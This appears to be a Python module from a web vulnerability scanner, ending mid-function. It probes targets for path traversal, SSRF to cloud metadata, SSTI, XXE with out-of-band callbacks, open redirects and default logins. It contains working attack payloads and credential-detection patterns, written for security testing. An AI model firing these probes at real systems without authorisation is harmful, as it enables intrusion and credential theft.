"""
Vulnerability Scanning Phases

This module contains 15 specialized vulnerability testing functions covering:
- SSL/TLS security analysis (testssl.sh)
- Framework-specific vulnerability scanning (Nikto, Nuclei templates)
- Client-side security (JavaScript secret extraction)
- API security (GraphQL introspection, schema exposure)
- OWASP Top 10: injection attacks (path traversal, SSRF, SSTI, XXE)
- Authentication bypass (default credentials)
- Cloud infrastructure exposure (S3, GCS, Azure buckets)
- Real-time communication security (WebSocket discovery/CSRF)
- Modern attack vectors (prototype pollution)
- Visual reconnaissance (screenshots)

Each phase maintains scan state for resumability and uses rate-limited,
authenticated sessions configured per the scan profile.
"""

import os
import re
import json
import time
import base64
import hashlib
from typing import Optional, List, Set
from urllib.parse import urlparse, urljoin, quote

from web_app.core.session import make_session
from web_app.data_structures import Finding, Severity, ScanConfig, ScanState
from web_app.output import _log, add_finding, section
from web_app.helpers import _tool_ok, looks_like_catchall, run_cmd
from web_app.discovered_state import DISCOVERED


def phase_ssl_tls(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """SSL/TLS Security Analysis using testssl.sh.

    Probes SSL/TLS certificate chain, cipher suites, protocol versions,
    and common misconfigurations (weak protocols, self-signed certs, etc.).
    """
    phase = "ssl_tls"
    if st.done(phase): return
    section("SSL/TLS Analysis (testssl)", out)
    if _tool_ok("testssl", out):
        run_cmd(["testssl", "--color", "0", "-U", "-S", "-P", "--fast", target],
                "testssl.sh", out, cfg, 300)
    st.mark(phase)


def phase_nikto(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Nikto Web Vulnerability Scanner.

    Runs Nikto with moderate tuning (skip cookies/errors) to identify
    common web server vulnerabilities without false-positive noise.
    Gated by no_intrusive flag due to aggressive probing.
    """
    phase = "nikto"
    if st.done(phase): return
    if cfg.no_intrusive:
        _log(out, "> Nikto skipped (--no-intrusive)."); st.mark(phase); return
    from web_app.input_helpers import yes_no
    if not cfg.auto and not yes_no("Run Nikto scan?"):
        _log(out, "> Nikto skipped."); st.mark(phase); return
    section("Nikto Web Vulnerability Scan", out)
    if _tool_ok("nikto", out):
        run_cmd(["nikto", "-h", cfg.base_url, "-Tuning", "123bde",
                 "-useragent", cfg.user_agent], "Nikto", out, cfg, 900)
    st.mark(phase)


def phase_nuclei(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Nuclei Template-Based Scanner.

    Uses ProjectDiscovery's Nuclei engine with configurable severity levels
    to detect vulnerabilities via a large, community-maintained template library.
    Converts JSONL output to findings with severity mapping.
    """
    phase = "nuclei"
    if st.done(phase): return
    section(f"Nuclei Template Scan ({cfg.nuclei_severity})", out)
    if not _tool_ok("nuclei", out):
        _log(out, "> nuclei not installed — `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`")
        st.mark(phase); return

    output_file = f"/tmp/nuclei_{hashlib.md5(target.encode()).hexdigest()}.jsonl"
    cmd = ["nuclei", "-u", cfg.base_url, "-severity", cfg.nuclei_severity,
           "-jsonl", "-o", output_file, "-silent",
           "-c", str(min(cfg.threads * 5, 25)),
           "-rate-limit", str(cfg.rate),
           "-timeout", "10"]
    if cfg.proxy:
        cmd += ["-proxy", cfg.proxy]
    if cfg.cookie:
        cmd += ["-H", f"Cookie: {cfg.cookie}"]
    for h in cfg.extra_headers:
        cmd += ["-H", h]
    if cfg.no_intrusive:
        cmd += ["-etags", "intrusive,fuzz,dos"]

    run_cmd(cmd, "nuclei scan", out, cfg, 1800)

    if os.path.exists(output_file):
        sev_map = {
            "info":     Severity.INFO,
            "low":      Severity.LOW,
            "medium":   Severity.MEDIUM,
            "high":     Severity.HIGH,
            "critical": Severity.CRITICAL,
            "unknown":  Severity.INFO,
        }
        count = 0
        with open(output_file) as fh:
            for line in fh:
                try:
                    entry = json.loads(line)
                    info = entry.get('info', {})
                    sev = sev_map.get(str(info.get('severity', 'info')).lower(),
                                      Severity.INFO)
                    name = info.get('name', entry.get('template-id', 'unknown'))
                    matched = entry.get('matched-at', entry.get('host', cfg.base_url))
                    add_finding(Finding(
                        title=f"Nuclei: {name}",
                        severity=sev,
                        description=info.get('description', name)[:500],
                        evidence=f"Matched: {matched}\nTemplate: {entry.get('template-id','')}\nTags: {info.get('tags','')}",
                        recommendation=info.get('remediation', 'See nuclei template for remediation.')[:500] if info.get('remediation') else "Review matched template for remediation guidance.",
                        phase=phase), out, cfg)
                    count += 1
                except Exception:
                    continue
        _log(out, f"\n## Nuclei Summary: {count} findings")
    st.mark(phase)


def phase_js_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """JavaScript Secret Extraction.

    Scans discovered and inline JavaScript files for patterns indicating
    exposed secrets: API keys, tokens, private keys, credentials, etc.
    Uses regex-based pattern matching (no AST analysis).
    """
    phase = "js_analysis"
    if st.done(phase): return
    section("JavaScript Secret Extraction", out)

    PATTERNS = {
        "AWS Access Key":   r"AKIA[0-9A-Z]{16}",
        "Generic API Key":  r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,64}['\"]",
        "Generic Token":    r"(?i)(token|access_token|auth_token)\s*[=:]\s*['\"][a-zA-Z0-9_.\-]{16,}['\"]",
        "Private Key":      r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
        "Google API Key":   r"AIza[0-9A-Za-z\-_]{35}",
        "Slack Token":      r"xox[baprs]-[0-9a-zA-Z]{10,48}",
        "GitHub Token":     r"ghp_[0-9a-zA-Z]{36}",
        "JWT":              r"eyJ[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}",
        "Basic Auth in URL":r"https?://[a-zA-Z0-9_\-]+:[a-zA-Z0-9_\-]+@",
        "Hardcoded Password":r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"][^'\"]{6,}['\"]",
        "Internal IP":      r"(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)(?:\d{1,3}\.){2}\d{1,3}",
    }

    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        js_urls = set()
        for m in re.finditer(r'(?:src|href)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', r.text, re.I):
            p = m.group(1)
            if p.startswith('http'):      js_urls.add(p)
            elif p.startswith('//'):      js_urls.add(f"https:{p}")
            else:                         js_urls.add(urljoin(cfg.base_url, p))

        # Augment with JS URLs discovered by crawler
        with DISCOVERED._lock:
            for u in DISCOVERED.urls:
                if u.endswith('.js') or '.js?' in u:
                    js_urls.add(u)

        _log(out, f"Analysing {len(js_urls)} JS files...")
        from colorama import Fore
        print(f"  {Fore.CYAN}ℹ Scanning {len(js_urls)} JS files for secrets")

        for js_url in list(js_urls)[:30]:
            try:
                jr = sess.get(js_url, timeout=cfg.timeout)
                if not jr.ok: continue
                for name, pat in PATTERNS.items():
                    hits = re.findall(pat, jr.text)
                    if hits:
                        add_finding(Finding(
                            title=f"Potential Secret in JS: {name}",
                            severity=Severity.HIGH,
                            description=f"Pattern `{name}` matched in `{js_url}`",
                            evidence=f"File: {js_url}\nMatches:\n" + '\n'.join(str(h)[:100] for h in hits[:5]),
                            recommendation="Remove secrets from client-side JS. Use server-side env variables.",
                            phase=phase), out, cfg)
            except Exception:
                continue
    except Exception as e:
        _log(out, f"> JS analysis failed: {e}")
    st.mark(phase)


def phase_graphql(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """GraphQL Endpoint Detection.

    Probes common GraphQL paths with introspection queries. Validates responses
    are actually GraphQL (JSON + data/errors keys) to avoid false positives from
    catch-all routing. Reports introspection enabled/disabled separately.
    """
    phase = "graphql"
    if st.done(phase): return
    section("GraphQL Endpoint Detection", out)
    paths = ["/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
             "/playground", "/graphql/console", "/api/v1/graphql"]
    sess = make_session(cfg)
    for path in paths:
        url = f"{cfg.base_url}{path}"
        try:
            r = sess.post(url, json={"query": "{__schema{queryType{name}}}"},
                          timeout=cfg.timeout)
            if r.status_code not in (200, 201, 400, 403):
                continue
            # Catch-all suppression
            if r.status_code in (200, 201) and looks_like_catchall(cfg, r.text, len(r.content)):
                _log(out, f"- `{path}` HTTP {r.status_code} (catch-all — skipped)")
                continue
            # Require JSON content-type
            ctype = r.headers.get('Content-Type', '').lower()
            if 'json' not in ctype:
                _log(out, f"- `{path}` HTTP {r.status_code} (non-JSON: {ctype}) — skipped")
                continue
            # Must parse as JSON
            try:
                data = r.json()
            except Exception:
                _log(out, f"- `{path}` HTTP {r.status_code} (JSON parse failed) — skipped")
                continue
            # Must have GraphQL-shaped response: top-level 'data' or 'errors'
            if not isinstance(data, dict) or not ({'data', 'errors'} & set(data.keys())):
                _log(out, f"- `{path}` HTTP {r.status_code} (JSON but no data/errors key) — skipped")
                continue

            # Now we're confident it's GraphQL — assess introspection
            introspection_works = (
                'data' in data and
                isinstance(data.get('data'), dict) and
                '__schema' in str(data.get('data', {}))
            )
            sev = Severity.MEDIUM if introspection_works else Severity.LOW
            desc = (f"GraphQL endpoint at {url}. "
                    f"{'Introspection enabled.' if introspection_works else 'Introspection appears disabled.'}")
            add_finding(Finding(
                title=f"GraphQL Endpoint: {path}",
                severity=sev,
                description=desc,
                evidence=f"POST {url} → HTTP {r.status_code}\nContent-Type: {ctype}\n{r.text[:600]}",
                recommendation=("Disable introspection in production. Add depth/complexity limits and auth."
                                if introspection_works else
                                "Verify introspection is disabled in production. Add auth + rate-limiting."),
                phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_path_traversal(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Path Traversal Vulnerability Probe.

    Tests common directory traversal payloads and detects successful escapes
    by matching sensitive file indicators (/etc/passwd, /windows/win.ini).
    Also tests discovered parameters for traversal vulnerability.
    """
    phase = "path_traversal"
    if st.done(phase): return
    section("Path Traversal Probe", out)
    payloads = ["../etc/passwd", "../../etc/passwd", "....//....//etc/passwd",
                "..%2fetc%2fpasswd", "%2e%2e%2fetc%2fpasswd", "../windows/win.ini"]
    indicators = ["root:x:0:0", "daemon:", "[extensions]", "bin/bash"]
    sess = make_session(cfg)
    for pl in payloads:
        try:
            r = sess.get(f"{cfg.base_url}/{pl}", timeout=cfg.timeout, allow_redirects=False)
            for ind in indicators:
                if ind in r.text:
                    add_finding(Finding(
                        title="Path Traversal Vulnerability",
                        severity=Severity.CRITICAL,
                        description="Path traversal payload returned sensitive file contents.",
                        evidence=f"Payload: {pl}\nHTTP {r.status_code}\nIndicator: {ind}\n{r.text[:400]}",
                        recommendation="Sanitise path inputs. Use allowlists. Avoid passing user input to filesystem calls.",
                        phase=phase), out, cfg)
                    break
        except Exception:
            continue

    # Also test discovered params for path traversal
    with DISCOVERED._lock:
        params = list(DISCOVERED.params)[:10]
    for param in params:
        for pl in payloads[:3]:
            try:
                r = sess.get(f"{cfg.base_url}?{param}={pl}", timeout=cfg.timeout)
                for ind in indicators:
                    if ind in r.text:
                        add_finding(Finding(
                            title=f"Path Traversal via `{param}`",
                            severity=Severity.CRITICAL,
                            description=f"Parameter `{param}` is vulnerable to path traversal.",
                            evidence=f"URL: {cfg.base_url}?{param}={pl}\nIndicator: {ind}",
                            recommendation="Validate/canonicalise path inputs. Use allowlists.",
                            phase=phase), out, cfg)
                        break
            except Exception:
                continue
    st.mark(phase)


def phase_open_redirect(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Open Redirect Vulnerability Probe.

    Tests redirect parameters with multiple bypass techniques (scheme-relative,
    backslash confusion, allowlist bypass tricks). Detects HTTP Location headers,
    meta-refresh, and JavaScript redirects.
    """
    phase = "open_redirect"
    if st.done(phase): return
    section("Open Redirect Probe", out)
    params = ["redirect", "url", "next", "return", "returnUrl", "goto",
              "destination", "continue", "redir", "redirect_uri", "target"]

    # Augment with discovered params
    with DISCOVERED._lock:
        params = list(set(params + [p for p in DISCOVERED.params
                                     if any(k in p.lower() for k in
                                            ('redirect', 'url', 'return', 'next', 'goto'))]))

    host = target.split(':')[0]
    canary_host = "webrecon-oredir.evil.com"

    payloads = [
        f"https://{canary_host}/",       # plain absolute
        f"//{canary_host}/",             # scheme-relative
        f"https:{canary_host}/",         # slash-less (browsers still honour)
        f"/\\{canary_host}/",            # backslash confusion
        f"https://{host}.{canary_host}/",        # subdomain-of-canary (prefix allowlist bypass)
        f"https://{canary_host}/{host}",         # path contains target (substring allowlist bypass)
        f"https://{canary_host}?{host}",         # query contains target
        f"https://{canary_host}@{host}/",        # userinfo trick (points at target, but flags parsing)
    ]

    def _redirects_offsite(resp) -> Optional[str]:
        """Return the offsite location if the response redirects (header OR
        meta-refresh OR JS) to the canary host; else None."""
        loc = resp.headers.get("Location", "")
        if canary_host in loc:
            return f"Location header → {loc}"
        body = resp.text[:8000]
        # <meta http-equiv="refresh" content="0;url=...canary...">
        if re.search(rf'(?i)http-equiv=["\']?refresh["\']?[^>]*{re.escape(canary_host)}', body):
            m = re.search(rf'(?i)url=([^"\'>\s]*{re.escape(canary_host)}[^"\'>\s]*)', body)
            return f"meta-refresh → {m.group(1) if m else canary_host}"
        # window.location / location.href / location.replace('...canary...')
        if re.search(rf'(?i)(location\.(href|replace)|window\.location)\s*[=(]\s*["\'][^"\']*{re.escape(canary_host)}', body):
            return "JS redirect (window.location / location.href)"
        return None

    sess = make_session(cfg)
    reported: Set[str] = set()   # one finding per param
    for param in params:
        if param in reported:
            continue
        for pl in payloads:
            try:
                r = sess.get(f"{cfg.base_url}?{quote(param, safe='')}={quote(pl, safe='')}",
                             timeout=cfg.timeout, allow_redirects=False)
                hit = _redirects_offsite(r)
                if hit:
                    reported.add(param)
                    add_finding(Finding(
                        title=f"Open Redirect: `{param}` parameter",
                        severity=Severity.MEDIUM,
                        description=(f"Parameter `{param}` redirects to an attacker-controlled host. "
                                     f"Bypass class: `{pl}`."),
                        evidence=f"URL: {cfg.base_url}?{param}={pl}\n{hit}",
                        recommendation=("Validate redirect targets against an allowlist of permitted hosts. "
                                        "Reject scheme-relative (//), backslash, and userinfo (@) forms; "
                                        "compare the parsed host, not a substring match."),
                        phase=phase), out, cfg)
                    break
            except Exception:
                continue
    st.mark(phase)


def phase_ssrf(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """SSRF (Server-Side Request Forgery) Probe.

    Uses out-of-band (OOB) marker-based detection to test parameters for SSRF.
    Also probes for direct cloud metadata access (AWS, GCP, DigitalOcean).
    Requires --oob-url for markers; also attempts local file access.
    """
    phase = "ssrf"
    if st.done(phase): return
    section("SSRF Probe", out)
    if not cfg.oob_url:
        _log(out, "> SSRF skipped — no --oob-url provided.")
        from colorama import Fore
        print(f"  {Fore.YELLOW}⚠ SSRF skipped — provide --oob-url")
        st.mark(phase); return

    sess = make_session(cfg)

    # Common SSRF-prone parameter names
    common = ['url', 'uri', 'path', 'src', 'dest', 'redirect', 'target', 'host',
              'site', 'file', 'document', 'page', 'feed', 'image', 'load',
              'fetch', 'proxy', 'callback', 'link', 'ref']

    with DISCOVERED._lock:
        discovered = list(DISCOVERED.params)
    params = list(set(common + discovered))[:30]

    hits_sent = 0
    for param in params:
        marker = hashlib.md5(param.encode()).hexdigest()[:8]
        payload = f"http://{marker}.{cfg.oob_url}/"
        # Test as GET parameter
        try:
            sess.get(f"{cfg.base_url}?{param}={payload}",
                     timeout=cfg.timeout, allow_redirects=False)
            hits_sent += 1
        except Exception:
            pass
        # Test as JSON body against discovered endpoints
        for ep in list(DISCOVERED.endpoints)[:5]:
            try:
                url = urljoin(cfg.base_url, ep)
                sess.post(url, json={param: payload},
                          timeout=cfg.timeout)
                hits_sent += 1
            except Exception:
                continue

    # Cloud metadata sweep
    metadata_targets = [
        "http://169.254.169.254/latest/meta-data/",     # AWS
        "http://169.254.169.254/computeMetadata/v1/",   # GCP
        "http://metadata.google.internal/",             # GCP
        "http://169.254.169.254/metadata/v1/",          # DigitalOcean
        "file:///etc/passwd",
    ]
    for meta in metadata_targets:
        for param in ('url', 'uri', 'src'):
            try:
                r = sess.get(f"{cfg.base_url}?{param}={meta}",
                             timeout=cfg.timeout)
                if any(s in r.text for s in ('ami-id', 'iam/security-credentials',
                                              'instance-id', 'root:x:0:0')):
                    add_finding(Finding(
                        title=f"SSRF to Cloud Metadata via `{param}`",
                        severity=Severity.CRITICAL,
                        description=f"Parameter `{param}` fetches cloud metadata service.",
                        evidence=f"URL: {cfg.base_url}?{param}={meta}\nResponse: {r.text[:300]}",
                        recommendation="Block outbound requests to link-local metadata IPs. Use IMDSv2 (AWS). Validate URL scheme/host.",
                        phase=phase), out, cfg)
            except Exception:
                continue

    add_finding(Finding(
        title=f"SSRF OOB Probes Sent ({hits_sent} requests)",
        severity=Severity.INFO,
        description=f"SSRF payloads with marker-prefixed subdomains sent. Monitor {cfg.oob_url} for DNS/HTTP callbacks.",
        evidence=f"OOB base: {cfg.oob_url}\nParameters tested: {len(params)}",
        recommendation="Correlate DNS callbacks by the 8-char marker prefix → parameter name.",
        phase=phase), out, cfg)
    st.mark(phase)


def phase_ssti(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Server-Side Template Injection (SSTI) Detection.

    Uses DIFFERENTIAL approach to eliminate false positives:
      1. Baseline with canary value
      2. Probe with mathematical expression (e.g., {{31337*1337}})
      3. Control with different expression (e.g., {{31337*1338}})

    Fires only if probe result appears AND control doesn't, eliminating
    generic dumping pages and static responses.
    """
    phase = "ssti"
    if st.done(phase): return
    section("SSTI Probe", out)
    sess = make_session(cfg)

    # Each entry: (probe_payload, probe_result, control_payload, control_result, engine)
    # Numbers chosen to be distinctive and not collide with timestamps, IDs etc.
    PROBES = [
        ("{{31337*1337}}",     "41897569", "{{31337*1338}}",     "41928906", "Jinja2/Twig"),
        ("${31337*1337}",      "41897569", "${31337*1338}",      "41928906", "FreeMarker/JSP-EL"),
        ("<%= 31337*1337 %>",  "41897569", "<%= 31337*1338 %>",  "41928906", "ERB/EJS"),
        ("#{31337*1337}",      "41897569", "#{31337*1338}",      "41928906", "Ruby/Thymeleaf"),
        ("${{31337*1337}}",    "41897569", "${{31337*1338}}",    "41928906", "Handlebars-like"),
        ("@(31337*1337)",      "41897569", "@(31337*1338)",      "41928906", "Razor"),
    ]

    common = ['name', 'search', 'query', 'q', 'msg', 'message', 'greeting',
              'title', 'content', 'input', 'text']
    with DISCOVERED._lock:
        discovered = list(DISCOVERED.params)
    params = list(set(common + discovered))[:20]

    canary_value = "__webrecon_ssti_canary__"

    for param in params:
        # Step 1: baseline with a canary value
        try:
            base = sess.get(f"{cfg.base_url}?{param}={canary_value}",
                            timeout=cfg.timeout)
            baseline_text = base.text
        except Exception:
            continue

        for probe_pl, probe_res, control_pl, control_res, engine in PROBES:
            try:
                # Step 2: the actual SSTI probe
                pr = sess.get(f"{cfg.base_url}?{param}={probe_pl}",
                              timeout=cfg.timeout)
                probe_text = pr.text

                # Quick fail: probe result not in response → no SSTI
                if probe_res not in probe_text:
                    continue

                # Quick fail: probe result was already in baseline → coincidence
                if probe_res in baseline_text:
                    continue

                # Step 3: differential check with control payload
                cr = sess.get(f"{cfg.base_url}?{param}={control_pl}",
                              timeout=cfg.timeout)
                control_text = cr.text

                # If probe response also contains the control result, the page
                # is reflecting both / dumping data. Not real SSTI.
                if control_res in probe_text:
                    continue

                # Control payload should produce its own result (templated)
                # OR the page should differ from baseline
                control_evaluated = control_res in control_text
                differs_from_baseline = abs(len(probe_text) - len(baseline_text)) > 8

                if not (control_evaluated or differs_from_baseline):
                    continue

                add_finding(Finding(
                    title=f"SSTI ({engine}) via `{param}`",
                    severity=Severity.CRITICAL,
                    description=(f"Parameter `{param}` evaluates template expressions ({engine}). "
                                 f"Differential check confirmed: probe '{probe_pl}' produced "
                                 f"'{probe_res}', control '{control_pl}' produced "
                                 f"'{control_res}'."),
                    evidence=(f"Param: {param}\n"
                              f"Probe payload:   {probe_pl} → '{probe_res}' present\n"
                              f"Control payload: {control_pl} → '{control_res}' "
                              f"{'present' if control_evaluated else 'absent'}\n"
                              f"Baseline contained probe result: {probe_res in baseline_text}\n"
                              f"URL: {cfg.base_url}?{param}={probe_pl}"),
                    recommendation="Never pass user input to template engines as template code. Use parameterised rendering (context data only).",
                    phase=phase), out, cfg)
                break
            except Exception:
                continue
    st.mark(phase)


def phase_xxe(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """XXE (XML External Entity) Injection Probe.

    Tests multiple XXE attack vectors across different content types:
    - Classic external entity
    - Parameter-entity blind (defeats many parsers)
    - SOAP envelopes
    - SVG-embedded XXE

    Requires --oob-url for OOB callbacks; also tests direct local file access.
    """
    phase = "xxe"
    if st.done(phase): return
    section("XXE Probe", out)
    if not cfg.oob_url:
        _log(out, "> XXE skipped — no --oob-url provided.")
        from colorama import Fore
        print(f"  {Fore.YELLOW}⚠ XXE skipped — provide --oob-url")
        st.mark(phase); return

    # Classic external entity
    payload_classic = (f'<?xml version="1.0"?>\n'
                       f'<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-classic">]>\n'
                       f'<root><data>&xxe;</data></root>')

    # Parameter-entity blind (defeats many modern parsers that disable external entities
    # but not external DTDs)
    payload_blind = (f'<?xml version="1.0"?>\n'
                     f'<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://{cfg.oob_url}/xxe-blind-dtd">%xxe;]>\n'
                     f'<root/>')

    # SOAP envelope
    payload_soap = (f'<?xml version="1.0"?>\n'
                    f'<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-soap">]>\n'
                    f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
                    f'<soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>')

    # SVG-embedded XXE
    payload_svg = (f'<?xml version="1.0"?>\n'
                   f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-svg">]>\n'
                   f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')

    tests = [
        (payload_classic, "application/xml"),
        (payload_blind,   "application/xml"),
        (payload_soap,    "text/xml"),
        (payload_soap,    "application/soap+xml"),
        (payload_svg,     "image/svg+xml"),
    ]

    sess = make_session(cfg)
    # Test against discovered endpoints + common API paths
    with DISCOVERED._lock:
        endpoints = list(DISCOVERED.endpoints)[:10]
    paths = ["/api/", "/api/v1/", "/upload", "/import", "/xml", "/soap",
             "/parse", "/svg"] + endpoints

    for path in paths:
        for payload, content_type in tests:
            try:
                url = urljoin(cfg.base_url, path)
                sess.post(url, data=payload,
                          headers={"Content-Type": content_type},
                          timeout=cfg.timeout)
            except Exception:
                continue

    add_finding(Finding(
        title="XXE Probes Sent (classic + blind + SOAP + SVG)",
        severity=Severity.INFO,
        description=f"XXE payloads sent across {len(paths)} endpoints and {len(tests)} content-type variants. Monitor {cfg.oob_url} for DNS/HTTP callbacks.",
        evidence="Markers: xxe-classic, xxe-blind-dtd, xxe-soap, xxe-svg",
        recommendation="Disable external entity & external DTD processing in all XML parsers (defusedxml / feature flags).",
        phase=phase), out, cfg)
    st.mark(phase)


def phase_default_creds(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Default Credential Testing.

    Attempts login with common default credential pairs across multiple
    platforms (Tomcat, WordPress, Jenkins, generic APIs). Success logic is
    explicit: basic auth (401→200), form auth (success_text present &&
    failure_text absent), JSON auth (2xx + token/session key).

    Gated by no_intrusive flag — submits live credentials that can trigger
    lockouts and SOC alerts.
    """
    phase = "default_creds"
    if st.done(phase): return
    section("Default Credential Testing", out)

    # This phase SUBMITS live credentials to real login endpoints, which can
    # trigger account lockouts, WAF blocks and SOC alerts. Treat it like every
    # other aggressive check in this tool and gate it behind intrusive mode.
    if cfg.no_intrusive:
        _log(out, "> Default-credential testing skipped (--no-intrusive). "
                  "It submits live logins (lockout/alert risk); re-run without "
                  "--no-intrusive to enable.")
        from colorama import Fore
        print(f"  {Fore.YELLOW}⚠ Default-cred testing skipped (--no-intrusive — avoids lockouts)")
        st.mark(phase); return

    # (indicator_path, login_path, auth_type, user_field, pass_field, user, pwd, success_text, failure_text)
    PLATFORMS = [
        ("/manager/html",  "/manager/html",           "basic", None, None, "tomcat",  "s3cret",  "Tomcat Web Application Manager", None),
        ("/manager/html",  "/manager/html",           "basic", None, None, "admin",   "admin",   "Tomcat Web Application Manager", None),
        ("/manager/html",  "/manager/html",           "basic", None, None, "tomcat",  "tomcat",  "Tomcat Web Application Manager", None),
        ("/j_acegi_security_check", "/j_acegi_security_check", "form", "j_username", "j_password", "admin", "admin", None, "loginError"),
        ("/wp-login.php",  "/wp-login.php",           "form", "log", "pwd", "admin", "admin", "wp-admin", "login_error"),
        ("/api/login",     "/api/login",              "json", "user", "password", "admin", "admin", None, None),  # Grafana-like
    ]

    sess = make_session(cfg)

    for indicator, login_path, auth_type, uf, pf, user, pwd, success_text, failure_text in PLATFORMS:
        # Confirm target exposes the platform
        try:
            check = sess.get(f"{cfg.base_url}{indicator}", timeout=cfg.timeout,
                             allow_redirects=False)
            if check.status_code not in (200, 302, 401, 403):
                continue
        except Exception:
            continue

        login_url = f"{cfg.base_url}{login_path}"
        success = False
        evidence = ""

        try:
            if auth_type == "basic":
                # Must have been 401 without creds AND 200 with creds
                if check.status_code != 401:
                    continue
                r = sess.get(login_url, auth=(user, pwd), timeout=cfg.timeout,
                             allow_redirects=False)
                success = (r.status_code == 200 and
                           (not success_text or success_text.lower() in r.text.lower()))
                evidence = f"GET {login_url} (basic auth) → HTTP {r.status_code}"

            elif auth_type == "form":
                if uf is None or pf is None:
                    continue
                r = sess.post(login_url, data={uf: user, pf: pwd},
                              timeout=cfg.timeout, allow_redirects=True)
                # Success = expected text present AND failure text absent
                body = r.text.lower()
                has_success = success_text and success_text.lower() in body
                has_failure = failure_text and failure_text.lower() in body
                success = bool(has_success and not has_failure)
                evidence = f"POST {login_url} ({uf}={user}) → HTTP {r.status_code}"

            elif auth_type == "json":
                if uf is None or pf is None:
                    continue
                r = sess.post(login_url, json={uf: user, pf: pwd},
                              timeout=cfg.timeout)
                # Success = 2xx + auth token in body/cookies (heuristic)
                success = (r.status_code in (200, 201) and
                           any(k in r.text.lower() for k in ('token', 'session', 'authenticated', 'success')))
                evidence = f"POST {login_url} (json) → HTTP {r.status_code}\n{r.text[:200]}"

        except Exception as e:
            _log(out, f"> Login attempt failed for {login_path}: {e}")
            continue

        if success:
            add_finding(Finding(
                title=f"Default Credentials Valid: {login_path}",
                severity=Severity.CRITICAL,
                description=f"Default credentials `{user}`/`{pwd}` accepted at {login_path}",
                evidence=evidence,
                recommendation="Change default credentials immediately. Enforce a strong password policy.",
                phase=phase), out, cfg)

    st.mark(phase)


def phase_cloud_buckets(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Cloud Storage Bucket Enumeration.

    Probes for publicly accessible S3, GCS, and Azure blob buckets using
    domain-based name generation (variations of the target domain + common suffixes).
    Reports both public (200) and private (403) buckets.
    """
    phase = "cloud_buckets"
    if st.done(phase): return
    section("Cloud Storage Bucket Enumeration", out)

    host = target.split(':')[0]
    parts = host.split('.')
    base_names = [parts[-2] if len(parts) >= 2 else host,
                  host.replace('.', '-'), host.replace('.', '')]
    suffixes = ['', '-backup', '-data', '-assets', '-static', '-media',
                '-uploads', '-dev', '-staging', '-prod', '-files', '-logs']
    sess = make_session(cfg)

    for base in list(dict.fromkeys(base_names))[:2]:
        for suffix in suffixes:
            name = f"{base}{suffix}"
            for url, cloud in [
                (f"https://{name}.s3.amazonaws.com/",         "S3"),
                (f"https://storage.googleapis.com/{name}/",   "GCS"),
                (f"https://{name}.blob.core.windows.net/",    "Azure"),
            ]:
                try:
                    r = sess.get(url, timeout=5)
                    if r.status_code == 200:
                        add_finding(Finding(
                            title=f"Public {cloud} Bucket: {name}",
                            severity=Severity.HIGH,
                            description=f"Publicly accessible {cloud} bucket: {url}",
                            evidence=f"GET {url} → HTTP 200\n{r.text[:300]}",
                            recommendation=f"Restrict {cloud} bucket ACL. Block public access policy.",
                            phase=phase), out, cfg)
                    elif r.status_code == 403:
                        _log(out, f"ℹ️ {cloud} bucket exists (private): {url}")
                except Exception:
                    continue
    st.mark(phase)


def phase_websockets(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """WebSocket Discovery & Analysis.

    Identifies WebSocket endpoints through static analysis (HTML/JS scanning)
    and active probing (Upgrade handshake). Tests cross-origin acceptance
    to detect CSRF-like WebSocket vulnerabilities.
    """
    phase = "websocket"
    if st.done(phase): return
    section("WebSocket Discovery", out)

    sess = make_session(cfg)

    ws_endpoints: Set[str] = set()
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        for m in re.finditer(r'wss?://[A-Za-z0-9_.\-:/]+', r.text):
            ws_endpoints.add(m.group(0))
        for m in re.finditer(r'new\s+WebSocket\(\s*["\']([^"\']+)', r.text):
            ws_endpoints.add(m.group(1))
    except Exception:
        pass

    # JS files already discovered
    with DISCOVERED._lock:
        js_urls = [u for u in DISCOVERED.urls if u.endswith('.js') or '.js?' in u][:15]
    for ju in js_urls:
        try:
            jr = sess.get(ju, timeout=cfg.timeout)
            for m in re.finditer(r'wss?://[A-Za-z0-9_.\-:/]+', jr.text):
                ws_endpoints.add(m.group(0))
            for m in re.finditer(r'new\s+WebSocket\(\s*["\']([^"\']+)', jr.text):
                ws_endpoints.add(m.group(1))
        except Exception:
            continue

    # Probe common WS paths via Upgrade handshake
    common_ws = ["/ws", "/wss", "/socket", "/socket.io/?EIO=4&transport=websocket",
                 "/cable", "/websocket", "/api/ws"]
    for path in common_ws:
        url = f"{cfg.base_url}{path}"
        try:
            key = base64.b64encode(os.urandom(16)).decode()
            r = sess.get(url, timeout=cfg.timeout, headers={
